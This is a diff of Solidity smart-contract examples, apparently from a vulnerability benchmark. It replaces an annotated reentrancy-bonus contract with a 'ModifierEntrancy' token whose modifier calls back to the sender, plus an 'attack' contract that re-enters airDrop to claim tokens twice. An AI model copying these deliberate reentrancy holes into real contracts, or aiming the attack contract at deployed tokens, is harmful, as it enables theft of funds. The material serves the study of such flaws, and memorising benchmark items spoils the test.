@@ -1,31 +1,43 @@
-/*
- * @source: https://consensys.github.io/smart-contract-best-practices/known_attacks/
- * @author: consensys
- * @vulnerable_at_lines: 28
- */
-
 pragma solidity ^0.4.24;
 
-contract Reentrancy_bonus{
+contract ModifierEntrancy {
+  mapping (address => uint) public tokenBalance;
+  string constant name = "Nu Token";
 
-    // INSECURE
-    mapping (address => uint) private userBalances;
-    mapping (address => bool) private claimedBonus;
-    mapping (address => uint) private rewardsForA;
+  
+  
+  function airDrop() hasNoBalance supportsToken  public{
+    tokenBalance[msg.sender] += 20;
+  }
 
-    function withdrawReward(address recipient) public {
-        uint amountToWithdraw = rewardsForA[recipient];
-        rewardsForA[recipient] = 0;
-        (bool success, ) = recipient.call.value(amountToWithdraw)("");
-        require(success);
+  
+  modifier supportsToken() {
+    require(keccak256(abi.encodePacked("Nu Token")) == Bank(msg.sender).supportsToken());
+    _;
+  }
+  
+  modifier hasNoBalance {
+      require(tokenBalance[msg.sender] == 0);
+      _;
+  }
+}
+
+contract Bank{
+    function supportsToken() external pure returns(bytes32){
+        return(keccak256(abi.encodePacked("Nu Token")));
     }
+}
 
-    function getFirstWithdrawalBonus(address recipient) public {
-        require(!claimedBonus[recipient]); // Each recipient should only be able to claim the bonus once
-
-        rewardsForA[recipient] += 100;
-        // <yes> <report> REENTRANCY
-        withdrawReward(recipient); // At this point, the caller will be able to execute getFirstWithdrawalBonus again.
-        claimedBonus[recipient] = true;
+contract attack{ 
+    bool hasBeenCalled;
+    function supportsToken() external returns(bytes32){
+        if(!hasBeenCalled){
+            hasBeenCalled = true;
+            ModifierEntrancy(msg.sender).airDrop();
+        }
+        return(keccak256(abi.encodePacked("Nu Token")));
+    }
+    function call(address token) public{
+        ModifierEntrancy(token).airDrop();
     }
 }
